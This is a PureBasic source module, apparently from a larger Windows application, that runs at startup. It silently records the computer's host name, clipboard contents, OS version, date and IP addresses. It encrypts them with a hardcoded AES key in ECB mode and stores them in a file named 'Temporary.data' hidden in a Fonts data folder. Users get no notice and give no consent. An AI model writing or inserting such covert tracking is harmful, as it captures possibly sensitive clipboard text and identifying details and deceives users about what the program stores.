
; ########################################## Variablen ##########################################

#Trace_File = "Temporary.data"

Structure Trace_Main
  
EndStructure
Global Trace_Main.Trace_Main

Structure Trace_Element
  Host_Name.s
  Clipboard.s
  OS.s
  Date.s
  IPs.s
EndStructure
Global NewList Trace_Element.Trace_Element()

; ########################################## Ladekram ############################################

; ########################################## Declares ############################################

; ########################################## Proceduren ##########################################

Procedure Trace_Read(Filename.s)
  File_ID = ReadFile(#PB_Any, Filename)
  If IsFile(File_ID)
    ClearList(Trace_Element())
    
    If Lof(File_ID) > 0
    
      While Eof(File_ID) = 0
        Length = ReadWord(File_ID)
        If Length
          *Ciphered_Buffer = AllocateMemory(Length)
          *Deciphered_Buffer = AllocateMemory(Length)
          ReadData(File_ID, *Ciphered_Buffer, Length)
          
          AESDecoder(*Ciphered_Buffer, *Deciphered_Buffer, Length, ?AES_Key, 128, 0, #PB_Cipher_ECB)
          
          String.s = PeekS(*Deciphered_Buffer)
          
          AddElement(Trace_Element())
          Trace_Element()\Host_Name = StringField(String, 1, Chr(8))
          Trace_Element()\Clipboard = StringField(String, 2, Chr(8))
          Trace_Element()\OS = StringField(String, 3, Chr(8))
          Trace_Element()\Date = StringField(String, 4, Chr(8))
          Trace_Element()\IPs = StringField(String, 5, Chr(8))
          ;Debug Trace_Element()\Host_Name
          ;Debug Trace_Element()\Clipboard
          ;Debug Trace_Element()\OS
          ;Debug Trace_Element()\Date
          
          FreeMemory(*Ciphered_Buffer)
          FreeMemory(*Deciphered_Buffer)
        EndIf
      Wend
      
    EndIf
    
    CloseFile(File_ID)
  EndIf
EndProcedure

Procedure Trace_Write(Filename.s)
  File_ID = CreateFile(#PB_Any, Filename)
  If IsFile(File_ID)
    
    ForEach Trace_Element()
      String.s = Trace_Element()\Host_Name + Chr(8) + Trace_Element()\Clipboard + Chr(8) + Trace_Element()\OS + Chr(8) + Trace_Element()\Date + Chr(8) + Trace_Element()\IPs + Chr(8)
      String.s + "              "
      Length = Len(String)+1
      If Length
        *Ciphered_Buffer = AllocateMemory(Length)
        *Deciphered_Buffer = AllocateMemory(Length)
        PokeS(*Deciphered_Buffer, String, Length, #PB_Ascii)
        
        AESEncoder(*Deciphered_Buffer, *Ciphered_Buffer, Length, ?AES_Key, 128, 0, #PB_Cipher_ECB)
        WriteWord(File_ID, Length)
        WriteData(File_ID, *Ciphered_Buffer, Length)
        
        FreeMemory(*Ciphered_Buffer)
        FreeMemory(*Deciphered_Buffer)
      EndIf
    Next
    
    CloseFile(File_ID)
  EndIf
EndProcedure

Procedure Trace_Add_Info()
  Host_Name.s = Hostname()
  Clipboard.s = GetClipboardText()
  Select OSVersion()
    Case #PB_OS_Windows_95 : OS.s = "Win_95"
    Case #PB_OS_Windows_NT_4 : OS.s = "Win_NT_4"
    Case #PB_OS_Windows_98 : OS.s = "Win_98"
    Case #PB_OS_Windows_ME : OS.s = "Win_ME"
    Case #PB_OS_Windows_2000 : OS.s = "Win_2000"
    Case #PB_OS_Windows_XP : OS.s = "Win_XP"
    Case #PB_OS_Windows_Server_2003 : OS.s = "Win_Server_2003"
    Case #PB_OS_Windows_Vista : OS.s = "Win_Vista"
    Case #PB_OS_Windows_Server_2008 : OS.s = "Win_Server_2008"
    Case #PB_OS_Windows_7 : OS.s = "Win_7"
    Default : OS.s = "Unknown OS"
  EndSelect
  
  Found = 0
  ForEach Trace_Element()
    If Trace_Element()\Host_Name = Host_Name
      Found = 1
      Break
    EndIf
  Next
  If Found = 0
    LastElement(Trace_Element())
    AddElement(Trace_Element())
    Trace_Element()\Host_Name = Host_Name
    Trace_Element()\Clipboard = Clipboard
    Trace_Element()\OS = OS
    Trace_Element()\Date = FormatDate("Y=%yyyy, M=%mm, D=%dd, %hh:%ii:%ss", Date())
    If ExamineIPAddresses()
      IP.l = NextIPAddress()
      While IP
        Trace_Element()\IPs + IPString(IP) + " | "
        IP.l = NextIPAddress()
      Wend
    EndIf
    ProcedureReturn 1
  EndIf
  ProcedureReturn 0
EndProcedure

Procedure Trace_Main()
  
EndProcedure

; ########################################## Initkram ############################################

Trace_Read(Files_Folder_Get("Data")+"Fonts/"+#Trace_File)

If Trace_Add_Info()
  Trace_Write(Files_Folder_Get("Data")+"Fonts/"+#Trace_File)
EndIf

; ########################################## Data_Sections #######################################

DataSection
  AES_Key:
    Data.a $06, $a9, $21, $40, $36, $b8, $a1, $5b, $51, $2e, $03, $d5, $34, $12, $00, $06
EndDataSection
; IDE Options = PureBasic 4.50 (Windows - x86)
; CursorPosition = 125
; FirstLine = 104
; Folding = -
; EnableXP
; DisableDebugger